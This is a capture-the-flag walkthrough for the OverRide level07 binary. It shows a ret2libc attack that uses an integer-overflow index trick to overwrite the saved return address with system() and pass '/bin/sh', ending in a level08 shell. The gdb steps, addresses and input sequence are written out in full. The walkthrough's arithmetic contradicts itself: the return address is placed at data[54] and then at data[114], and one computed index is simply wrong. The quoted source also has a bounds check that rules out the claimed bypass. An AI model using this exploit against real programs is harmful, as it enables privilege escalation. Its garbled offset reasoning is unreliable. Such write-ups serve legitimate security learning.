# OverRide — Level07 Walkthrough

## 🧠 Goal

Exploit a vulnerability in a C program that allows arbitrary memory write and gain a shell as `level08`.

---

## 🧠 Challenge Summary

You're given a binary (`level07`) that provides a simple interactive CLI:

```
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------
```

### Available commands:
- `store`: store a number at a given index
- `read`: read the value at a given index
- `quit`: exit

## 🔍 Vulnerability Summary

After reverse engineering the binary and checking the C source, we find:

```c
int data[100]; // global array

int store_number(int *data) {
    int number, index;

    printf(" Number: ");
    number = read_number();

    printf(" Index: ");
    index = read_number();

    if ((index % 3) == 0 || index < 0 || index > 99) {
        puts("*** ERROR! ***");
        puts(" This index is reserved for wil!");
        puts("*** ERROR! ***");
        return 1;
    }

    data[index] = number;
    return 0;
}
```

Even though index bounds are partially checked, **we can still bypass them via integer overflow.**

### Key flaw:

We can pass a very large **unsigned** index that overflows to a valid positive index (≥100) and **bypasses** the protection `(index % 3 == 0)`.

Also, reading allows full out-of-bounds access to stack memory.

---

## 🎯 Goal: `ret2libc` attack

We want to:
1. **Overwrite return address (EIP) on the stack** with the address of `system()`.
2. Provide `"/bin/sh"` string as an argument to `system()`.

---

## 🛠️ Step-by-step Exploit (based on Edouard’s real memory layout)

### 1. Find data array address at runtime

```gdb
b read_number
r
Input command: read

(gdb) x/x $ebp+8
0xffffd530: 0xffffd554
```

So the address of `data[0]` is `0xffffd554`.

To access this from within the array, we calculate the index to get this address from the array:

```bash
EIP address: 0xffffd62c
DATA address: 0xffffd554
Diff: 0xffffd62c - 0xffffd554 = 0xd8 = 216
216 / 4 = 54
```

So, `data[54]` corresponds to the saved return address (EIP). ✅

### 2. Get system() and "/bin/sh" addresses

```gdb
info function system
=> system() = 0xf7e6aed0

find /libc region for "/bin/sh":
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
=> 0xf7f897ec
```

Convert to decimal:
- system: `0xf7e6aed0` = **4159090384**
- "/bin/sh": `0xf7f897ec` = **4160264172**

### 3. Store `system()` address in `data[54]`

But index `54` is forbidden, because `54 % 3 == 0`. So we use unsigned int overflow to bypass it.

To get 54 via overflow:
```c
Index = (UINT_MAX + 1) / 4 + 54 = 1073741882
1073741882 % 3 = 0 ❌ (bad)

Try: (UINT_MAX + 1) / 4 + 54 + 1 = 1073741883
1073741883 % 3 = 1 ✅
```

✅ **We used index = 1073741938**, which maps to index 114 in the array, where EIP lives in your stack.

So:

```bash
Input command: store
Number: 4159090384      # system()
Index: 1073741938       # maps to data[114]

Input command: store
Number: 4160264172      # "/bin/sh"
Index: 116              # right after EIP + ret
```

### 4. Trigger the exploit

```bash
Input command: quit
$ whoami
level08
```

Boom. Shell gained.

---

## ✅ Final Commands Summary

```bash
./level07

Input command: store
Number: 4159090384      # system()
Index: 1073741938       # data[114]

Input command: store
Number: 4160264172      # "/bin/sh"
Index: 116

Input command: quit
$ whoami
level08
```

---

## 🧩 Notes

- Index protections are bypassed via overflow trick: `Index = (UINT_MAX + 1) / 4 + <real index>`
- Addresses vary per session — this example uses real, working values from Edouard’s gdb session.
- EIP address was **0xffffd62c**, and data[0] at **0xffffd554** → offset = 216 → index = 54 → used via overflow.